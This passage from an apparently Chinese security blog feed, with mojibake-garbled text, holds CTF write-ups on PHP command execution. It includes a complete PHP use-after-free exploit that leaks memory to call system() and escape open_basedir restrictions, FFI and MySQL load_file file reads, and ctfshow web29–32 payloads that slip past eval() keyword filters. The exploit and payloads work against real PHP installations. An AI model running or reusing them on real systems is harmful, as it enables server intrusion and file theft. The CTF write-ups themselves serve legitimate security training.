flag.php<br>ç„¶åè®¿é—®/flag.php.bz2è¿›è¡Œä¸‹è½½è·å¾—flag.php</p><h3 id="è¿‡æ»¤äº†æ•°å­—"><a href="#è¿‡æ»¤äº†æ•°å­—" class="headerlink" title="è¿‡æ»¤äº†æ•°å­—"></a>è¿‡æ»¤äº†æ•°å­—</h3><p>åœ¨èƒ½ä½¿ç”¨systemï¼Œshellä¸­å¯ä»¥åˆ©ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$((~$(())))</span><br><span class="line">-1</span><br></pre></td></tr></table></figure><h3 id="open-basedirå—é™"><a href="#open-basedirå—é™" class="headerlink" title="open basedirå—é™"></a>open basedirå—é™</h3><h4 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?&gt;&lt;?php</span><br><span class="line"></span><br><span class="line">function ctfshow($cmd) &#123;</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    class Vuln &#123;</span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() &#123; </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace = (new Exception)-&gt;getTrace();</span><br><span class="line">            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123;</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; </span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123;</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) &#123;</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trigger_uaf($arg) &#123;</span><br><span class="line"></span><br><span class="line">        $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line">        $vuln = new Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = 10; </span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(&#x27;x&#x27;);</span><br><span class="line">    $abc = $backtrace[1][&#x27;args&#x27;][0];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); </span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();</span><br><span class="line">exit();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨å…¶ä»–åº”ç”¨"><a href="#åˆ©ç”¨å…¶ä»–åº”ç”¨" class="headerlink" title="åˆ©ç”¨å…¶ä»–åº”ç”¨"></a>åˆ©ç”¨å…¶ä»–åº”ç”¨</h4><p>å¦‚mysql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flagc.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><h3 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h3><blockquote><p>FFIæ‰©å±•å·²ç»é€šè¿‡RFCï¼Œæ­£å¼æˆä¸ºPHP 7.4æ ¸å¿ƒæ‰©å±•ã€‚</p><p>ä»€ä¹ˆæ˜¯FFI</p><p>FFIï¼ˆForeign Function Interfaceï¼‰ï¼Œå³å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œæ˜¯æŒ‡åœ¨ä¸€ç§è¯­è¨€é‡Œè°ƒç”¨å¦ä¸€ç§è¯­è¨€ä»£ç çš„æŠ€æœ¯ã€‚PHPçš„FFIæ‰©å±•å°±æ˜¯ä¸€ä¸ªè®©ä½ åœ¨PHPé‡Œè°ƒç”¨Cä»£ç çš„æŠ€æœ¯ã€‚</p><p>FFIçš„ä½¿ç”¨éå¸¸ç®€å•ï¼Œåªç”¨å£°æ˜å’Œè°ƒç”¨ä¸¤æ­¥å°±å¯ä»¥ï¼Œå¯¹äºæœ‰Cè¯­è¨€ç»éªŒï¼Œä½†æ˜¯ä¸äº†è§£Zendå¼•æ“çš„ç¨‹åºå‘˜æ¥è¯´ï¼Œè¿™ç®€ç›´æ˜¯æ‰“å¼€äº†æ–°ä¸–ç•Œçš„å¤§é—¨ï¼Œå¯ä»¥å¿«é€Ÿåœ°ä½¿ç”¨Cç±»åº“è¿›è¡ŒåŸå‹è¯•éªŒã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$a=&#x27;/readflag&gt; 1.txt&#x27;;</span><br><span class="line">$ffi-&gt;system($a);exit();</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;webå®‰å…¨ä¹‹å‘½ä»¤æ‰§è¡Œ&quot;&gt;&lt;a href=&quot;#webå®‰å…¨ä¹‹å‘½ä»¤æ‰§è¡Œ&quot; class=&quot;headerlink&quot; title=&quot;webå®‰å…¨ä¹‹å‘½ä»¤æ‰§è¡Œ&quot;&gt;&lt;/a&gt;webå®‰å…¨ä¹‹å‘½ä»¤æ‰§è¡Œ&lt;/h1&gt;&lt;p&gt;æ— èŠæ—¶é—´ï¼Œå†™ç‚¹æœ€è¿‘ä¸€ç›´ç ”ç©¶çš„å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›å¿ƒå¾—ä¸æ€»ç»“ã€‚&lt;/p&gt;
&lt;p&gt;å¸Œæœ›åš</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ctfshowå‘½ä»¤æ‰§è¡Œ</title>
    <link href="http://websec.space/2022/01/29/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://websec.space/2022/01/29/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2022-01-28T16:00:00.000Z</published>
    <updated>2022-02-11T09:12:01.184Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshowå‘½ä»¤æ‰§è¡Œ"><a href="#ctfshowå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ctfshowå‘½ä»¤æ‰§è¡Œ"></a>ctfshowå‘½ä»¤æ‰§è¡Œ</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><blockquote><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>åªè¿‡æ»¤äº†flag</p><p>payload1ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=system(&#x27;cat fl&quot;&quot;ag.php&#x27;);</span><br></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=system(&#x27;cat fla``g.php&#x27;);</span><br></pre></td></tr></table></figure><p>å®˜æ–¹payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `nl fl&#x27;&#x27;ag.php`;</span><br></pre></td></tr></table></figure><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><blockquote><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†systemï¼Œè€ƒè™‘ç”¨highlight_fileç»“æœå¤±è´¥äº†</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br></pre></td></tr></table></figure><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><blockquote><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>è¿‡æ»¤çš„æœ‰ç‚¹å¤ªç‹ äº†</p><p>æŸ¥çœ‹å½“å‰æ–‡ä»¶å¤¹çš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p>exp1ï¼š</p><p>åªèƒ½å¾—åˆ°æ•°ç»„çš„ç¬¬äºŒä½æˆ–è€…å€’æ•°ç¬¬äºŒä½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>exp2ï¼š</p><p>éšæœºè·å–ï¼Œéœ€è¦å¤šåˆ·æ–°å‡ æ¬¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>exp3ï¼šé¸¡è‚‹ï¼Œæœ‰æ—¶å€™ä¸èƒ½æ‹¿åˆ°å®é™…å€¼</p><p>session_start(): å‘Šè¯‰PHPä½¿ç”¨<a href="https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020">session</a>;    session_id(): è·å–åˆ°å½“å‰çš„session_idå€¼ï¼›æ‰‹åŠ¨è®¾ç½®cookieä¸­PHPSESSID=flag.phpï¼›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p>çœ‹åˆ°è¿™é‡Œæˆ‘æƒ³è¯´å¯„ï¼Œè¿‡æ»¤äº†æ‹¬å·å’Œç©ºæ ¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>åœ¨æ­¤ä½¿ç”¨æ–‡ä»¶åŒ…å«expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="php-åè®®"><a href="#php-åè®®" class="headerlink" title="php:// åè®®"></a><code>php://</code> åè®®</h3><p><strong>æ¡ä»¶</strong>ï¼š</p><p><code>allow_url_fopen</code>:off/on</p><p><code>allow_url_include</code> :ä»…<code>php://input php://stdin php://memory php://temp </code>éœ€è¦on</p><p>ä½œç”¨<strong>ï¼š<br><code>php://</code> è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯<code>php://filter</code>å’Œ<code>php://input</code>ï¼Œ<code>php://filter</code>ç”¨äº</strong>è¯»å–æºç <strong>ï¼Œ<code>php://input</code>ç”¨äº</strong>æ‰§è¡Œphpä»£ç **ã€‚</p><p>è¯´æ˜ï¼š<br>PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ<br>å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚</p><table><thead><tr><th>åè®®</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>php://input</td><td>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨POSTè¯·æ±‚ä¸­è®¿é—®POSTçš„<code>data</code>éƒ¨åˆ†ï¼Œåœ¨<code>enctype=&quot;multipart/form-data&quot;</code> çš„æ—¶å€™<code>php://input </code>æ˜¯æ— æ•ˆçš„ã€‚ä¸è¦ç”¨hackerä¼ 